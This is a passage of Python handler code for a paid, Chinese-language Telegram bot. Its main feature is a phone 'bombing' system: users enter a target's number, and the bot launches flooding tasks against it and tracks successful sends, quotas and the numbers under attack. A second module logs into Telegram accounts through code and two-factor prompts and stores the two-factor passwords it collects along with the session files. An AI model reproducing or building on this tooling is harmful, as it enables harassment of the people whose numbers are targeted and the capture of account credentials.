    async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text

        if text == "返回主菜单":
            await update.message.reply_text("主菜单:", reply_markup=SystemKeyboards.main_menu())
            return ConversationHandler.END

        if text == "反登录系统":
            sessions = SessionManager.get_active_sessions(user_id)
            count = len(sessions)
            await update.message.reply_text(
                f"反登录系统\n监控中: {count} 个账号\n\n请选择操作:",
                reply_markup=SystemKeyboards.anti_login_menu()
            )
            return ConversationHandler.END

        if text == "轰炸系统":
            user_task_ids = user_tasks.get(user_id, [])
            active_count = 0
            for task_id in user_task_ids:
                task_data = active_tasks.get(task_id)
                if task_data and task_data.is_running and not task_data.is_stopped:
                    active_count += 1
            
            await update.message.reply_text(
                f"轰炸系统\n您的任务: {active_count} / {Config.MAX_TASKS_PER_USER}\n\n请选择操作:",
                reply_markup=SystemKeyboards.bomb_menu()
            )
            return ConversationHandler.END

        if text == "管理面板":
            if not AdminManager.is_admin(user_id):
                await update.message.reply_text("没有权限")
                return ConversationHandler.END
            await update.message.reply_text("管理面板:", reply_markup=SystemKeyboards.admin_menu())
            return ConversationHandler.END

        if text == "统计信息":
            user_task_ids = user_tasks.get(user_id, [])
            total_success = 0
            total_fail = 0
            for task_id in user_task_ids:
                task_data = active_tasks.get(task_id)
                if task_data:
                    total_success += task_data.success_count
                    total_fail += task_data.fail_count
            
            text_msg = (
                f"📊 您的统计信息\n"
                f"──────────────────────\n"
                f"📋 总任务数: {len(user_task_ids)}\n"
                f"✅ 成功发送: {total_success}\n"
                f"❌ 失败: {total_fail}\n"
            )
            if total_success + total_fail > 0:
                rate = (total_success/(total_success+total_fail)*100)
                text_msg += f"📈 成功率: {rate:.1f}%\n\n"
            
            text_msg += (
                f"📊 系统统计:\n"
                f"• 总请求: {stats['total_requests']}\n"
                f"• 成功: {stats['total_success']} | 失败: {stats['total_fails']}\n"
                f"⏰ 运行时间: {(datetime.now() - stats['start_time']).total_seconds()/3600:.1f} 小时"
            )
            await update.message.reply_text(text_msg, parse_mode='HTML')
            return ConversationHandler.END

        if text == "上传会话文件":
            await update.message.reply_text("请发送 .session 文件", reply_markup=SystemKeyboards.cancel())
            return PHONE_INPUT

        if text == "手机号登录":
            await update.message.reply_text("请输入手机号 (格式: +8613800000000):", reply_markup=SystemKeyboards.cancel())
            return PHONE_INPUT

        if text == "我的会话":
            sessions = SessionManager.get_active_sessions(user_id)
            if not sessions:
                await update.message.reply_text("没有活跃会话", reply_markup=SystemKeyboards.anti_login_menu())
                return ConversationHandler.END
            await update.message.reply_text(
                f"活跃会话: {len(sessions)} 个\n\n点击断开:",
                reply_markup=SystemKeyboards.session_management(user_id)
            )
            return ConversationHandler.END

        if text == "断开所有":
            sessions = SessionManager.get_active_sessions(user_id)
            if not sessions:
                await update.message.reply_text("没有活跃会话")
                return ConversationHandler.END
            count = 0
            for phone in list(sessions.keys()):
                if await SessionManager.stop_monitoring(user_id, phone, archive=True):
                    count += 1
            await update.message.reply_text(f"已断开 {count} 个账号", reply_markup=SystemKeyboards.anti_login_menu())
            return ConversationHandler.END

        if text == "我的任务":
            panel_text = format_panel_text(user_id)
            user_task_ids = user_tasks.get(user_id, [])
            await update.message.reply_text(
                panel_text,
                reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
            )
            return ConversationHandler.END

        if text == "增加配额":
            user_task_ids = user_tasks.get(user_id, [])
            active_count = 0
            for task_id in user_task_ids:
                task_data = active_tasks.get(task_id)
                if task_data and task_data.is_running and not task_data.is_stopped:
                    active_count += 1
            
            if active_count >= Config.MAX_TASKS_PER_USER:
                await update.message.reply_text(
                    f"❌ 您的配额已满！\n当前活跃任务: {active_count}/{Config.MAX_TASKS_PER_USER}\n请停止或删除任务后再添加"
                )
                return ConversationHandler.END
            
            context.user_data['adding_task'] = True
            await update.message.reply_text(
                "➕ 增加配额\n\n"
                "请输入目标手机号（格式：+8613800138000）:\n\n"
                "输入 /cancel 取消操作",
                reply_markup=SystemKeyboards.cancel()
            )
            return PHONE_INPUT

        if text == "停止所有任务":
            user_task_ids = user_tasks.get(user_id, [])
            count = 0
            for task_id in user_task_ids:
                task_data = active_tasks.get(task_id)
                if task_data and task_data.is_running and not task_data.is_stopped:
                    await task_data.stop()
                    count += 1
            await update.message.reply_text(f"已停止 {count} 个任务", reply_markup=SystemKeyboards.bomb_menu())
            return ConversationHandler.END

        if text == "启动所有任务":
            user_task_ids = user_tasks.get(user_id, [])
            count = 0
            for task_id in user_task_ids:
                task_data = active_tasks.get(task_id)
                if task_data and task_data.is_stopped:
                    await task_data.start()
                    count += 1
            await update.message.reply_text(f"已启动 {count} 个任务", reply_markup=SystemKeyboards.bomb_menu())
            return ConversationHandler.END

        if text == "添加管理员":
            if not AdminManager.is_super_admin(user_id):
                await update.message.reply_text("只有超级管理员可以操作")
                return ConversationHandler.END
            context.user_data['state'] = 'add_admin'
            await update.message.reply_text("发送要添加的用户ID:", reply_markup=SystemKeyboards.cancel())
            return PHONE_INPUT

        if text == "移除管理员":
            if not AdminManager.is_super_admin(user_id):
                await update.message.reply_text("只有超级管理员可以操作")
                return ConversationHandler.END
            context.user_data['state'] = 'remove_admin'
            await update.message.reply_text("发送要移除的用户ID:", reply_markup=SystemKeyboards.cancel())
            return PHONE_INPUT

        if text == "列出管理员":
            if not AdminManager.is_admin(user_id):
                await update.message.reply_text("没有权限")
                return ConversationHandler.END
            admins = AdminManager.list_admins()
            if not admins:
                await update.message.reply_text("暂无管理员")
                return ConversationHandler.END
            lines = ["管理员列表:\n"]
            for admin in admins:
                lines.append(f"{admin['type']}: {admin['id']}")
            await update.message.reply_text('\n'.join(lines), parse_mode='HTML')
            return ConversationHandler.END

        if text == "强制激活":
            if not AdminManager.is_admin(user_id):
                await update.message.reply_text("没有权限")
                return ConversationHandler.END
            context.user_data['state'] = 'force_activate'
            await update.message.reply_text(
                "强制激活用户\n\n发送: 用户ID 备注\n示例: 123456789 管理员手动激活",
                reply_markup=SystemKeyboards.cancel()
            )
            return PHONE_INPUT

        if text == "生成卡密":
            if not AdminManager.is_admin(user_id):
                await update.message.reply_text("没有权限")
                return ConversationHandler.END
            context.user_data['state'] = 'generate_keys'
            await update.message.reply_text(
                "生成备用卡密\n\n发送: 数量 备注\n示例: 5 备用卡密",
                reply_markup=SystemKeyboards.cancel()
            )
            return PHONE_INPUT

        if text == "列出卡密":
            if not AdminManager.is_admin(user_id):
                await update.message.reply_text("没有权限")
                return ConversationHandler.END
            keys = BackupKeyManager.list_keys(only_unused=True)
            if not keys:
                await update.message.reply_text("暂无未使用的卡密")
                return ConversationHandler.END
            lines = ["未使用的卡密:\n"]
            for k in keys[:20]:
                note = f" 备注:{k['note']}" if k.get("note") else ''
                lines.append(f"{k['key']}{note}")
            if len(keys) > 20:
                lines.append(f"\n... 还有 {len(keys)-20} 张")
            await update.message.reply_text('\n'.join(lines), parse_mode='HTML')
            return ConversationHandler.END

        if text == "查看被轰炸手机":
            if not AdminManager.is_admin(user_id):
                await update.message.reply_text("没有权限")
                return ConversationHandler.END
            
            if not active_tasks:
                await update.message.reply_text("当前没有正在轰炸的手机号")
                return ConversationHandler.END
            
            lines = ["📱 正在被轰炸的手机号:\n"]
            for task_id, task_data in active_tasks.items():
                status = "🔥 轰炸中" if task_data.is_running and not task_data.is_stopped else "⏸ 已停止"
                lines.append(f"• {task_data.phone_number} | {status} | 成功: {task_data.success_count} | 失败: {task_data.fail_count}")
            
            await update.message.reply_text('\n'.join(lines), parse_mode='HTML')
            return ConversationHandler.END

        if text == "停止轰炸手机":
            if not AdminManager.is_admin(user_id):
                await update.message.reply_text("没有权限")
                return ConversationHandler.END
            context.user_data['state'] = 'stop_bomb'
            await update.message.reply_text(
                "停止轰炸手机\n\n发送要停止的手机号:\n示例: +8613800138000",
                reply_markup=SystemKeyboards.cancel()
            )
            return PHONE_INPUT

        return ConversationHandler.END

    @staticmethod
    async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text
        if text == "取消":
            await update.message.reply_text("已取消", reply_markup=SystemKeyboards.main_menu())
            return ConversationHandler.END

        current_state = context.user_data.get('state')

        if current_state == 'add_admin':
            try:
                admin_id = int(text.strip())
                success, msg = AdminManager.add_admin(admin_id, user_id)
                await update.message.reply_text(msg, reply_markup=SystemKeyboards.admin_menu())
            except ValueError:
                await update.message.reply_text("无效的用户ID", reply_markup=SystemKeyboards.admin_menu())
            context.user_data.pop('state', None)
            return ConversationHandler.END

        if current_state == 'remove_admin':
            try:
                admin_id = int(text.strip())
                success, msg = AdminManager.remove_admin(admin_id, user_id)
                await update.message.reply_text(msg, reply_markup=SystemKeyboards.admin_menu())
            except ValueError:
                await update.message.reply_text("无效的用户ID", reply_markup=SystemKeyboards.admin_menu())
            context.user_data.pop('state', None)
            return ConversationHandler.END

        if current_state == 'force_activate':
            parts = text.split()
            try:
                target_id = int(parts[0])
                note = ' '.join(parts[1:]) if len(parts) > 1 else '管理员强制'
                if PaymentManager.check_payment_status(target_id)["status"] == "paid":
                    await update.message.reply_text(f"用户 {target_id} 已激活", reply_markup=SystemKeyboards.admin_menu())
                else:
                    PaymentManager.mark_user_paid(target_id, f"force:{note}", {"admin": user_id, "note": note})
                    await update.message.reply_text(f"已强制激活: {target_id}\n备注: {note}", reply_markup=SystemKeyboards.admin_menu())
                    try:
                        await context.bot.send_message(target_id, "您的账号已被管理员激活，发送 /start 开始使用")
                    except:
                        pass
            except ValueError:
                await update.message.reply_text("无效输入", reply_markup=SystemKeyboards.admin_menu())
            context.user_data.pop('state', None)
            return ConversationHandler.END

        if current_state == 'generate_keys':
            parts = text.split()
            count = int(parts[0]) if parts and parts[0].isdigit() else 1
            note = ' '.join(parts[1:]) if len(parts) > 1 else ''
            count = min(count, 20)
            keys = []
            for _ in range(count):
                keys.append(BackupKeyManager.generate_key(note, user_id))
            lines = '\n'.join(keys)
            await update.message.reply_text(
                f"已生成 {count} 张卡密:\n\n{lines}\n\n备注: {note if note else '无'}",
                reply_markup=SystemKeyboards.admin_menu()
            )
            context.user_data.pop('state', None)
            return ConversationHandler.END

        if current_state == 'stop_bomb':
            phone_number = text.strip()
            if not re.match(r'^\+\d{7,15}$', phone_number):
                await update.message.reply_text("手机号格式错误！请使用 +8613800138000 格式", reply_markup=SystemKeyboards.admin_menu())
                return PHONE_INPUT
            
            if phone_number not in phone_to_task_id:
                await update.message.reply_text(f"未找到手机号 {phone_number} 的轰炸任务", reply_markup=SystemKeyboards.admin_menu())
                context.user_data.pop('state', None)
                return ConversationHandler.END
            
            task_id = phone_to_task_id[phone_number]
            task_data = active_tasks.get(task_id)
            
            if not task_data:
                await update.message.reply_text("任务数据异常", reply_markup=SystemKeyboards.admin_menu())
                context.user_data.pop('state', None)
                return ConversationHandler.END
            
            if task_data.task and not task_data.task.done():
                task_data.task.cancel()
                try:
                    await task_data.task
                except asyncio.CancelledError:
                    pass
            
            if task_data.phone_number in phone_to_task_id:
                del phone_to_task_id[task_data.phone_number]
            
            if task_data.user_id in user_tasks and task_id in user_tasks[task_data.user_id]:
                user_tasks[task_data.user_id].remove(task_id)
            
            del active_tasks[task_id]
            
            await update.message.reply_text(
                f"✅ 已停止轰炸并删除任务\n手机号: {phone_number}\n最终统计: 成功 {task_data.success_count} | 失败 {task_data.fail_count}",
                reply_markup=SystemKeyboards.admin_menu()
            )
            context.user_data.pop('state', None)
            return ConversationHandler.END

        return ConversationHandler.END

    @staticmethod
    async def handle_phone_or_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text or ""
        if text == "取消":
            await update.message.reply_text("已取消", reply_markup=SystemKeyboards.main_menu())
            return ConversationHandler.END

        if context.user_data.get('adding_task'):
            phone_number = text.strip()
            
            if not re.match(r'^\+\d{7,15}$', phone_number):
                await update.message.reply_text(
                    "❌ 手机号格式错误！\n格式: +8613800138000\n\n请重新输入或输入 /cancel 取消"
                )
                return PHONE_INPUT
            
            if phone_number in phone_to_task_id:
                existing_task_id = phone_to_task_id[phone_number]
                existing_task = active_tasks.get(existing_task_id)
                if existing_task and existing_task.user_id != user_id:
                    await update.message.reply_text(
                        f"⚠️ {phone_number} 正在被其他用户轰炸中！\n请使用不同的手机号。"
                    )
                    return PHONE_INPUT
                elif existing_task and existing_task.user_id == user_id:
                    await update.message.reply_text(f"⚠️ {phone_number} 已经在您的任务列表中！")
                    await update_panel(user_id, context)
                    context.user_data['adding_task'] = False
                    return ConversationHandler.END
            
            user_task_ids = user_tasks.get(user_id, [])
            active_count = 0
            for task_id in user_task_ids:
                task_data = active_tasks.get(task_id)
                if task_data and task_data.is_running and not task_data.is_stopped:
                    active_count += 1
            
            if active_count >= Config.MAX_TASKS_PER_USER:
                await update.message.reply_text(
                    f"❌ 您的配额已满！\n当前活跃任务: {active_count}/{Config.MAX_TASKS_PER_USER}\n请停止或删除任务后再添加"
                )
                context.user_data['adding_task'] = False
                return ConversationHandler.END
            
            if user_id in user_usage:
                user_usage[user_id]["total_tasks"] = user_usage[user_id].get("total_tasks", 0) + 1
                user_usage[user_id]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            else:
                user_usage[user_id] = {
                    "first_name": update.effective_user.first_name,
                    "username": update.effective_user.username,
                    "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "total_tasks": 1
                }
            save_json_file(Config.USER_USAGE_FILE, user_usage)
            
            task_id = generate_task_id()
            task_data = TaskData(task_id, phone_number, user_id, user_id)
            active_tasks[task_id] = task_data
            phone_to_task_id[phone_number] = task_id
            
            if user_id not in user_tasks:
                user_tasks[user_id] = []
            user_tasks[user_id].append(task_id)
            
            task = asyncio.create_task(bomb_phone_number(task_id, user_id, context))
            task_data.task = task
            
            logger.info(f"用户 {user_id} 创建任务: {phone_number}")
            
            await update_panel(user_id, context)
            
            await update.message.reply_text(
                f"✅ 已开始轰炸 {phone_number}\n\n"
                f"📊 您的配额: {active_count+1}/{Config.MAX_TASKS_PER_USER}",
                reply_markup=SystemKeyboards.bomb_menu()
            )
            
            context.user_data['adding_task'] = False
            return ConversationHandler.END

        if update.message.document:
            doc = update.message.document
            if not doc.file_name.endswith('.session'):
                await update.message.reply_text("必须是 .session 文件")
                return PHONE_INPUT

            user_dir = SessionManager.get_user_dir(user_id)
            temp_path = user_dir / f"temp_{user_id}_{datetime.now().timestamp()}.session"

            try:
                file = await doc.get_file()
                await file.download_to_drive(temp_path)
                await update.message.reply_text("文件接收成功，正在识别...")

                is_alive, phone = await SessionManager.check_session_alive(temp_path)
                if not is_alive or not phone:
                    await update.message.reply_text("无效或已过期的会话")
                    if temp_path.exists():
                        temp_path.unlink()
                    return ConversationHandler.END

                final_path = user_dir / f"{phone}.session"
                if final_path.exists():
                    await SessionManager.stop_monitoring(user_id, phone, archive=True)
                    final_path.unlink()
                temp_path.rename(final_path)

                success = await SessionManager.start_monitoring(user_id, phone, final_path, update.get_bot())
                if success:
                    await update.message.reply_text(f"监控已启动\n手机号: {phone}", reply_markup=SystemKeyboards.anti_login_menu())
                else:
                    await update.message.reply_text("启动失败", reply_markup=SystemKeyboards.anti_login_menu())
                return ConversationHandler.END

            except Exception as e:
                logger.error(f"File error: {e}")
                await update.message.reply_text(f"错误: {e}", reply_markup=SystemKeyboards.anti_login_menu())
                if temp_path.exists():
                    temp_path.unlink()
                return ConversationHandler.END

        phone = text.strip()
        if re.match(r'^\+\d{10,15}$', phone):
            context.user_data['phone'] = phone
            user_dir = SessionManager.get_user_dir(user_id)
            final_path = user_dir / f"{phone}.session"
            telethon_path = str(user_dir / phone)

            sessions = SessionManager.get_active_sessions(user_id)
            if phone in sessions:
                await update.message.reply_text(f"手机号 {phone} 已在监控中", reply_markup=SystemKeyboards.anti_login_menu())
                return ConversationHandler.END

            await update.message.reply_text(f"正在连接 ({phone})...")

            try:
                creds = get_random_api_creds()
                client = TelegramClient(telethon_path, creds["api_id"], creds["api_hash"],
                                        device_model=Config.DEVICE_MODEL)
                client.flood_sleep_threshold = 60
                await client.connect()

                if await client.is_user_authorized():
                    await update.message.reply_text("已登录，启动监控")
                    await SessionManager.start_monitoring(user_id, phone, final_path, update.get_bot())
                    await update.message.reply_text(f"监控已启动\n手机号: {phone}", reply_markup=SystemKeyboards.anti_login_menu())
                    return ConversationHandler.END

                await client.send_code_request(phone)
                context.user_data['temp_client'] = client
                context.user_data['file_path'] = final_path

                await update.message.reply_text("验证码已发送，请输入5位数字:", reply_markup=SystemKeyboards.cancel())
                return VERIFICATION_CODE

            except FloodWaitError as e:
                await update.message.reply_text(f"操作频繁，请等待 {e.seconds}秒", reply_markup=SystemKeyboards.anti_login_menu())
                return ConversationHandler.END
            except Exception as e:
                logger.error(f"Login failed: {e}")
                await update.message.reply_text(f"登录失败: {e}", reply_markup=SystemKeyboards.anti_login_menu())
                return ConversationHandler.END

        await update.message.reply_text("格式错误，请输入 +8613800000000", reply_markup=SystemKeyboards.cancel())
        return PHONE_INPUT

    @staticmethod
    async def handle_verification_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text
        if text == "取消":
            if context.user_data.get('temp_client'):
                try:
                    await context.user_data['temp_client'].disconnect()
                except:
                    pass
            context.user_data.clear()
            await update.message.reply_text("已取消", reply_markup=SystemKeyboards.main_menu())
            return ConversationHandler.END

        client = context.user_data.get('temp_client')
        phone = context.user_data.get('phone')
        file_path = context.user_data.get('file_path')

        if not client or not phone:
            await update.message.reply_text("会话已过期，请重新开始", reply_markup=SystemKeyboards.main_menu())
            return ConversationHandler.END

        try:
            me = await client.get_me()
            if me:
                logger.info(f"Already logged in: {phone}")
                await update.message.reply_text("登录成功")
                try:
                    await client.disconnect()
                except:
                    pass
                await SessionManager.start_monitoring(user_id, phone, file_path, update.get_bot())
                context.user_data.clear()
                await update.message.reply_text(f"监控已启动\n手机号: {phone}", reply_markup=SystemKeyboards.anti_login_menu())
                return ConversationHandler.END
        except Exception as e:
            logger.debug(f"Check login failed: {e}")

        try:
            await client.sign_in(phone=phone, code=text)
            await update.message.reply_text("登录成功")
            try:
                await client.disconnect()
            except:
                pass

            await SessionManager.start_monitoring(user_id, phone, file_path, update.get_bot())
            context.user_data.clear()
            await update.message.reply_text(f"监控已启动\n手机号: {phone}", reply_markup=SystemKeyboards.anti_login_menu())
            return ConversationHandler.END

        except SessionPasswordNeededError:
            context.user_data['verification_code'] = text
            await update.message.reply_text("请输入二级密码:", reply_markup=SystemKeyboards.cancel())
            return TWO_FACTOR_PASSWORD

        except PhoneCodeInvalidError:
            await update.message.reply_text("验证码无效，请重新输入:", reply_markup=SystemKeyboards.cancel())
            return VERIFICATION_CODE

        except PhoneCodeExpiredError:
            logger.warning(f"Code expired: {phone}")
            try:
                await client.send_code_request(phone)
                await update.message.reply_text("已重新发送验证码，请输入:", reply_markup=SystemKeyboards.cancel())
                return VERIFICATION_CODE
            except Exception as e:
                logger.error(f"Resend failed: {e}")
                await update.message.reply_text(f"重新发送失败: {e}\n请使用 /start 重新开始", reply_markup=SystemKeyboards.main_menu())
                return ConversationHandler.END

        except FloodWaitError as e:
            await update.message.reply_text(f"请等待 {e.seconds}秒", reply_markup=SystemKeyboards.anti_login_menu())
            return ConversationHandler.END

        except Exception as e:
            error_msg = str(e)
            logger.error(f"Login error: {error_msg}")
            if "expired" in error_msg.lower():
                try:
                    await client.send_code_request(phone)
                    await update.message.reply_text("已重新发送验证码，请输入:", reply_markup=SystemKeyboards.cancel())
                    return VERIFICATION_CODE
                except Exception as send_err:
                    await update.message.reply_text(f"重新发送失败: {send_err}\n请使用 /start 重新开始", reply_markup=SystemKeyboards.main_menu())
                    return ConversationHandler.END
            else:
                await update.message.reply_text(f"错误: {error_msg}\n请使用 /start 重新开始", reply_markup=SystemKeyboards.main_menu())
                return ConversationHandler.END

    @staticmethod
    async def handle_two_factor(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text
        if text == "取消":
            if context.user_data.get('temp_client'):
                try:
                    await context.user_data['temp_client'].disconnect()
                except:
                    pass
            context.user_data.clear()
            await update.message.reply_text("已取消", reply_markup=SystemKeyboards.main_menu())
            return ConversationHandler.END

        client = context.user_data.get('temp_client')
        phone = context.user_data.get('phone')
        file_path = context.user_data.get('file_path')

        if not client or not phone:
            await update.message.reply_text("会话已过期，请重新开始", reply_markup=SystemKeyboards.main_menu())
            return ConversationHandler.END

        try:
            await client.sign_in(password=text)
            await update.message.reply_text("二级密码验证通过")

            TwoFAManager.save_password(user_id, phone, text)

            try:
                await client.disconnect()
            except:
                pass

            await SessionManager.start_monitoring(user_id, phone, file_path, update.get_bot())
            context.user_data.clear()
            await update.message.reply_text(f"监控已启动\n手机号: {phone}", reply_markup=SystemKeyboards.anti_login_menu())
            return ConversationHandler.END

        except PhoneCodeInvalidError:
            await update.message.reply_text("验证码过期，重新发送中...", reply_markup=SystemKeyboards.cancel())
            try:
                await client.send_code_request(phone)
                context.user_data.pop('verification_code', None)
                return VERIFICATION_CODE
            except Exception as e:
                await update.message.reply_text(f"重新发送失败: {e}", reply_markup=SystemKeyboards.main_menu())
                return ConversationHandler.END

        except PasswordHashInvalidError:
            await update.message.reply_text("二级密码错误，请重新输入:", reply_markup=SystemKeyboards.cancel())
            return TWO_FACTOR_PASSWORD

        except Exception as e:
            error_msg = str(e)
            if "expired" in error_msg.lower():
                await update.message.reply_text("验证码过期，重新发送中...", reply_markup=SystemKeyboards.cancel())
                try:
                    await client.send_code_request(phone)
                    context.user_data.pop('verification_code', None)
                    return VERIFICATION_CODE
                except Exception as send_err:
                    await update.message.reply_text(f"重新发送失败: {send_err}", reply_markup=SystemKeyboards.main_menu())
                    return ConversationHandler.END

            await update.message.reply_text(f"错误: {error_msg}", reply_markup=SystemKeyboards.main_menu())
            return ConversationHandler.END

    @staticmethod
    async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data

        await query.answer()

        if data == "verify_join":
            is_joined, msg = await ChannelVerifier.check_user_in_channel(context, user_id)

            if is_joined:
                username = query.from_user.username or query.from_user.first_name
                JoinRecordManager.record_joined(user_id, username)

                ps = PaymentManager.check_payment_status(user_id)

                if ps["status"] == "paid":
                    await query.edit_message_text(
                        "验证成功\n\n发送 /start 开始使用",
                        parse_mode='HTML'
                    )
                else:
                    await query.edit_message_text(
                        f"验证成功\n\n需要支付激活\n\n金额: {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}\n发送 /start 开始支付",
                        parse_mode='HTML'
                    )
            else:
                await query.edit_message_text(
                    "验证失败\n\n请确保:\n1. 点击加入频道按钮\n2. 加入后点击验证\n\n" +
                    f"调试信息: {msg}",
                    parse_mode='HTML',
                    reply_markup=ChannelVerifier.get_join_keyboard()
                )
            return

        if data == "noop":
            return

        if data.startswith("stop_single:"):
            phone = data.split(":", 1)[1]

            sessions = SessionManager.get_active_sessions(user_id)
            if phone not in sessions:
                await query.edit_message_text(f"手机号 {phone} 不在监控列表中", parse_mode='HTML')
                return

            await query.edit_message_text(f"正在断开: {phone}...", parse_mode='HTML')
            success = await SessionManager.stop_monitoring(user_id, phone, archive=True)

            if success:
                remaining = SessionManager.get_active_sessions(user_id)
                if remaining:
                    await query.edit_message_text(
                        f"已断开并归档: {phone}\n\n会话管理\n监控中 {len(remaining)} 个账号",
                        parse_mode='HTML',
                        reply_markup=SystemKeyboards.session_management(user_id)
                    )
                else:
                    await query.edit_message_text(
                        f"已断开并归档: {phone}\n\n没有活跃会话",
                        parse_mode='HTML'
                    )
            else:
                await query.edit_message_text(f"操作失败\n手机号: {phone}", parse_mode='HTML')

        elif data == "stop_all":
            sessions = SessionManager.get_active_sessions(user_id)
            phones = list(sessions.keys())

            if not phones:
                await query.edit_message_text("没有活跃会话")
                return

            await query.edit_message_text("正在断开所有监控...")

            count = 0
            for phone in phones:
                if await SessionManager.stop_monitoring(user_id, phone, archive=True):
                    count += 1

            await query.edit_message_text(f"已断开所有监控\n共断开 {count} 个账号", parse_mode='HTML')

        else:
            parts = data.split("_")
            if len(parts) < 2:
                return
            
            action_code = parts[0]
            token = parts[-1]
            
            if not await verify_session_token(user_id, token):
                new_token = await generate_session_token(user_id)
                await query.edit_message_text(
                    "安全验证失败！请刷新面板",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("刷新面板", callback_data=f"rf_{new_token}")]
                    ])
                )
                return
            
            if action_code == "rf":
                panel_text = format_panel_text(user_id)
                user_task_ids = user_tasks.get(user_id, [])
                await query.edit_message_text(
                    panel_text,
                    reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
                )
                return
            
            elif action_code == "ds":
                user_task_ids = user_tasks.get(user_id, [])
                user_success = 0
                user_fail = 0
                for task_id in user_task_ids:
                    task_data = active_tasks.get(task_id)
                    if task_data:
                        user_success += task_data.success_count
                        user_fail += task_data.fail_count
                
                text_msg = (
                    f"📊 您的详细统计\n"
                    f"──────────────────────\n"
                    f"📋 总任务数: {len(user_task_ids)}\n"
                    f"✅ 成功: {user_success}\n"
                    f"❌ 失败: {user_fail}\n"
                )
                if user_success + user_fail > 0:
                    rate = (user_success/(user_success+user_fail)*100)
                    text_msg += f"📈 成功率: {rate:.1f}%\n\n"
                
                text_msg += (
                    f"📊 系统统计:\n"
                    f"• 总请求: {stats['total_requests']}\n"
                    f"• 成功: {stats['total_success']} | 失败: {stats['total_fails']}\n"
                    f"⏰ 运行时间: {(datetime.now() - stats['start_time']).total_seconds()/3600:.1f} 小时"
                )
                
                await query.edit_message_text(
                    text_msg,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("返回主菜单", callback_data=f"rf_{token}")]
                    ])
                )
                return
            
            elif action_code == "aq":
                user_task_ids = user_tasks.get(user_id, [])
                active_count = 0
                for task_id in user_task_ids:
                    task_data = active_tasks.get(task_id)
                    if task_data and task_data.is_running and not task_data.is_stopped:
                        active_count += 1
                
                if active_count >= Config.MAX_TASKS_PER_USER:
                    await query.edit_message_text(
                        f"配额已满！{active_count}/{Config.MAX_TASKS_PER_USER}",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("返回", callback_data=f"rf_{token}")]
                        ])
                    )
                    return
                
                context.user_data['adding_task'] = True
                await query.edit_message_text(
                    "请输入目标手机号（格式：+8613800138000）:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("取消", callback_data=f"rf_{token}")]
                    ])
                )
                return PHONE_INPUT
            
            elif action_code == "sp":
                if len(parts) >= 2:
                    task_id = parts[1]
                    if task_id not in active_tasks:
                        await query.answer("任务不存在", show_alert=True)
                        return
                    
                    task_data = active_tasks[task_id]
                    if task_data.user_id != user_id:
                        await query.answer("这不是您的任务！", show_alert=True)
                        return
                    
                    await task_data.stop()
                    logger.info(f"用户 {user_id} 停止任务: {task_data.phone_number}")
                    
                    panel_text = format_panel_text(user_id)
                    user_task_ids = user_tasks.get(user_id, [])
                    await query.edit_message_text(
                        panel_text,
                        reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
                    )
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"已停止: {task_data.phone_number}"
                    )
                return
            
            elif action_code == "rs":
                if len(parts) >= 2:
                    task_id = parts[1]
                    if task_id not in active_tasks:
                        await query.answer("任务不存在", show_alert=True)
                        return
                    
                    task_data = active_tasks[task_id]
                    if task_data.user_id != user_id:
                        await query.answer("这不是您的任务！", show_alert=True)
                        return
                    
                    user_task_ids = user_tasks.get(user_id, [])
                    active_count = 0
                    for tid in user_task_ids:
                        t = active_tasks.get(tid)
                        if t and t.is_running and not t.is_stopped:
                            active_count += 1
                    
                    if active_count >= Config.MAX_TASKS_PER_USER:
                        await query.answer(f"配额已满！{active_count}/{Config.MAX_TASKS_PER_USER}", show_alert=True)
                        return
                    
                    await task_data.start()
                    logger.info(f"用户 {user_id} 重启任务: {task_data.phone_number}")
                    
                    panel_text = format_panel_text(user_id)
                    user_task_ids = user_tasks.get(user_id, [])
                    await query.edit_message_text(
                        panel_text,
                        reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
                    )
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"已启动: {task_data.phone_number}"
                    )
                return
            
            elif action_code == "dl":
                if len(parts) >= 2:
                    task_id = parts[1]
                    if task_id not in active_tasks:
                        await query.answer("任务不存在", show_alert=True)
                        return
                    
                    task_data = active_tasks[task_id]
                    if task_data.user_id != user_id:
                        await query.answer("这不是您的任务！", show_alert=True)
                        return
                    
                    if task_data.task and not task_data.task.done():
                        task_data.task.cancel()
                        try:
                            await task_data.task
                        except asyncio.CancelledError:
                            pass
                    
                    if task_data.phone_number in phone_to_task_id:
                        del phone_to_task_id[task_data.phone_number]
                    
                    if user_id in user_tasks and task_id in user_tasks[user_id]:
                        user_tasks[user_id].remove(task_id)
                    
                    del active_tasks[task_id]
                    logger.info(f"用户 {user_id} 删除任务: {task_data.phone_number}")
                    
                    panel_text = format_panel_text(user_id)
                    user_task_ids = user_tasks.get(user_id, [])
                    await query.edit_message_text(
                        panel_text,
                        reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
                    )
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"已删除: {task_data.phone_number}"
                    )
